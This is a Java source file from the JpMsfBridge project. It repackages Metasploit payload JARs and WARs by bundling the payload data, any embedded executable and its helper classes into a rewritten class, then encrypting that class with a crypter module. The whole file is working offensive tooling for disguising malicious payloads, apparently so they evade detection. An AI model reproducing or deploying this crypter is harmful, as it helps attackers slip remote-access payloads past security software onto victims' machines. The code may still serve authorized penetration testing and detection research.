/*
 * JpMsfBridge.
 * 
 * Copyright (c) 2012 Michael 'mihi' Schierl
 * All rights reserved.
 * 
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions
 * are met:
 * 
 * - Redistributions of source code must retain the above copyright notice,
 *   this list of conditions and the following disclaimer.
 *   
 * - Redistributions in binary form must reproduce the above copyright
 *   notice, this list of conditions and the following disclaimer in the
 *   documentation and/or other materials provided with the distribution.
 *   
 * - Neither name of the copyright holders nor the names of its
 *   contributors may be used to endorse or promote products derived from
 *   this software without specific prior written permission.
 *   
 * THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND THE CONTRIBUTORS
 * "AS IS" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT
 * LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR
 * A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT
 * HOLDERS OR THE CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT,
 * INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING,
 * BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS
 * OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND
 * ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR
 * TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE
 * USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
 */
package jpmsfbridge.crypter;

import java.io.ByteArrayOutputStream;
import java.io.DataOutputStream;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.util.Arrays;
import java.util.HashMap;
import java.util.Iterator;
import java.util.Map;
import java.util.zip.ZipEntry;
import java.util.zip.ZipInputStream;
import java.util.zip.ZipOutputStream;

import javapayload.Module;
import javapayload.builder.ClassBuilder;
import javapayload.builder.dynstager.DynStagerBuilder;
import javapayload.crypter.Crypter;

import org.objectweb.asm.ClassAdapter;
import org.objectweb.asm.ClassVisitor;
import org.objectweb.asm.ClassWriter;
import org.objectweb.asm.MethodAdapter;
import org.objectweb.asm.MethodVisitor;

public class CrypterBridge {

	private static final String PAYLOAD_CLASS_NAME = "metasploit/DecryptedPayload";
	private static final String TEMPLATE_CLASS_NAME = PayloadTemplate.class.getName().replace('.', '/');

	private static final String[] RESOURCE_NAMES = {
			"metasploit.dat",
			"metasploit/AESEncryption.class",
			"metasploit/PayloadTrustManager.class",
			// must be last!
			"metasploit/Payload.class"
	};

	public static boolean isResourceNeeded(String name) {
		return name.endsWith(".exe") || Arrays.asList(RESOURCE_NAMES).contains(name);
	}

	public static byte[] buildPayloadClass(Map/* <String,byte[]> */resources) throws Exception {
		byte[] metasploitDat = (byte[]) resources.remove("metasploit.dat");
		if (metasploitDat == null)
			throw new IllegalStateException("Unsupported input file (not from Metasploit)");
		ByteArrayOutputStream baos = new ByteArrayOutputStream();
		DataOutputStream dos = new DataOutputStream(baos);
		dos.writeInt(metasploitDat.length);
		dos.write(metasploitDat);
		byte[] exe = new byte[0];
		for (Iterator it = resources.entrySet().iterator(); it.hasNext();) {
			Map.Entry entry = (Map.Entry) it.next();
			if (((String) entry.getKey()).endsWith(".exe")) {
				exe = (byte[]) entry.getValue();
				it.remove();
				break;
			}
		}
		dos.writeInt(exe.length);
		dos.write(exe);
		dos.writeInt(resources.size());
		for (int i = 0; i < RESOURCE_NAMES.length; i++) {
			if (RESOURCE_NAMES[i].endsWith(".class") && resources.containsKey(RESOURCE_NAMES[i])) {
				byte[] res = (byte[]) resources.remove(RESOURCE_NAMES[i]);
				dos.writeInt(res.length);
				dos.write(res);
			}
		}
		if (resources.size() != 0)
			throw new IllegalStateException("Unsupported resources in JAR");

		final String encodedData = new String(baos.toByteArray(), "ISO-8859-1");
		final ClassWriter cw = new ClassWriter(0);
		class MyMethodVisitor extends MethodAdapter {
			public MyMethodVisitor(MethodVisitor mv) {
				super(mv);
			}

			private String cleanType(String type) {
				if (type.equals(TEMPLATE_CLASS_NAME)) {
					type = PAYLOAD_CLASS_NAME;
				}
				return type;
			}

			public void visitFieldInsn(int opcode, String owner, String name, String desc) {
				super.visitFieldInsn(opcode, cleanType(owner), name, desc);
			}

			public void visitMethodInsn(int opcode, String owner, String name, String desc) {
				super.visitMethodInsn(opcode, cleanType(owner), name, desc);
			}

			public void visitTypeInsn(int opcode, String type) {
				super.visitTypeInsn(opcode, cleanType(type));
			}

			public void visitLdcInsn(Object cst) {
				if ("ENCODED_DATA".equals(cst))
					DynStagerBuilder.visitStringConstant(mv, encodedData);
				else
					super.visitLdcInsn(cst);
			}
		}
		final ClassVisitor templateVisitor = new ClassAdapter(cw) {
			public void visit(int version, int access, String name, String signature, String superName, String[] interfaces) {
				super.visit(version, access, PAYLOAD_CLASS_NAME, signature, superName, interfaces);
			}

			public MethodVisitor visitMethod(int access, String name, String desc, String signature, String[] exceptions) {
				return new MyMethodVisitor(super.visitMethod(access, name, desc, signature, exceptions));
			}
		};
		ClassBuilder.visitClass(PayloadTemplate.class, templateVisitor, cw);
		return cw.toByteArray();
	}

	public static void main(String[] args) throws Exception {
		if (args.length < 2 || args.length > 3) {
			System.out.println("Usage: java jpmfsbridge.crypter.CrypterBridge <in.jar|war> <out.jar|war> [<crypter>]");
			return;
		}
		Boolean isWAR = null;
		ZipInputStream zis = new ZipInputStream(new FileInputStream(args[0]));
		ZipOutputStream zos = new ZipOutputStream(new FileOutputStream(args[1]));
		String crypter = args.length == 2 ? "RnR" : args[2];
		Map/* <String,byte[]> */resources = new HashMap();
		ZipEntry ze;
		int length;
		byte[] buf = new byte[4096];
		while ((ze = zis.getNextEntry()) != null) {
			ByteArrayOutputStream out = new ByteArrayOutputStream();
			while ((length = zis.read(buf)) != -1) {
				out.write(buf, 0, length);
			}
			String resourceName = ze.getName();
			Boolean strippedName = Boolean.FALSE;
			if (resourceName.startsWith("WEB-INF/classes/")) {
				strippedName = Boolean.TRUE;
				resourceName = resourceName.substring("WEB-INF/classes/".length());
			}
			if (isResourceNeeded(resourceName)) {
				resources.put(resourceName, out.toByteArray());
				if (isWAR == null)
					isWAR = strippedName;
				if (strippedName != isWAR)
					throw new IllegalStateException("WAR mixed with JAR is not supported");
			} else {
				zos.putNextEntry(new ZipEntry(ze.getName()));
				out.writeTo(zos);
			}
		}
		zis.close();
		byte[] result = buildPayloadClass(resources);
		Crypter c = (Crypter) Module.load(Crypter.class, crypter);
		byte[] crypted = c.crypt("metasploit/Payload", result);
		if (isWAR == null)
			throw new IllegalStateException("Unable to detect WAR/JAR layout");
		zos.putNextEntry(new ZipEntry((isWAR.booleanValue() ? "WEB-INF/classes/" : "") + "metasploit/Payload.class"));
		zos.write(crypted);
		zos.close();
	}
}
